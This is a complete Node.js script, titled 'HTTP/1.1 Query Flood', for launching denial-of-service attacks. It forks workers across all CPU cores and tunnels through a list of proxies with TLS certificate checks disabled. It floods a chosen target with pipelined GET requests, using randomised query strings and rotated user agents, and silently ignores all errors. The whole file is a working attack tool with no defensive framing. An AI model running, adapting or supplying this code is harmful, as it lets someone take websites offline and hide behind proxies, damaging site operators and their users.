#!/usr/bin/env node
/* HTTP/1.1 Query Flood */

const net = require('net');
const fs = require('fs');
const url = require('url');
const tls = require('tls');
const http = require('http');
const cluster = require('cluster');
const path = require('path');

const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
const rate = parseInt(process.argv[4]) || 10;

if (process.argv.length < 5) {
    console.log(`Usage: node ${path.basename(__filename)} <target> <time> <threads>`);
    console.log(`Dependencies: proxy.txt, ua.txt`);
    process.exit(0);
}

const parsed = url.parse(target);
const proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);
const UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
require('events').EventEmitter.defaultMaxListeners = Infinity;

function randomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function buildRequest() {
    let reqPath = parsed.path;
    if (reqPath.includes('[rand]')) {
        reqPath = reqPath.replace(/\[rand\]/g, randomString(Math.floor(Math.random() * 12) + 5));
    }
    const ua = UAs[Math.floor(Math.random() * UAs.length)];
    return `GET ${reqPath}?q=${randomString(Math.floor(Math.random() * 24) + 1)} HTTP/1.1\r\n` +
           `Host: ${parsed.host}\r\n` +
           `User-Agent: ${ua}\r\n` +
           `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n` +
           `Accept-Language: en-US,en;q=0.5\r\n` +
           `Connection: keep-alive\r\n\r\n`;
}

if (cluster.isMaster) {
    const numCPUs = require('os').cpus().length;
    for (let i = 0; i < numCPUs; i++) cluster.fork();
} else {
    setInterval(() => {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        if (!proxy || !proxy.includes(':')) return;
        const [ip, port] = proxy.split(':');
        
        const req = http.request({
            host: ip,
            port: parseInt(port),
            method: 'CONNECT',
            path: `${parsed.host}:443`,
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'keep-alive',
                'Connection': 'keep-alive',
            }
        });
        
        req.on('connect', (res, socket) => {
            const tlsConn = tls.connect({
                host: parsed.host,
                servername: parsed.host,
                rejectUnauthorized: false,
                socket: socket,
                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK'
            }, () => {
                for (let j = 0; j < rate; j++) {
                    tlsConn.write(buildRequest());
                }
            });
            
            tlsConn.on('error', () => tlsConn.destroy());
            tlsConn.on('timeout', () => tlsConn.destroy());
            tlsConn.setKeepAlive(true, 10000);
            tlsConn.setTimeout(10000);
        });
        
        req.on('error', () => {});
        req.end();
    }, 0);
}

setTimeout(() => {
    console.log(`[+] Attack finished: ${target} - ${time}s`);
    process.exit(0);
}, time * 1000);
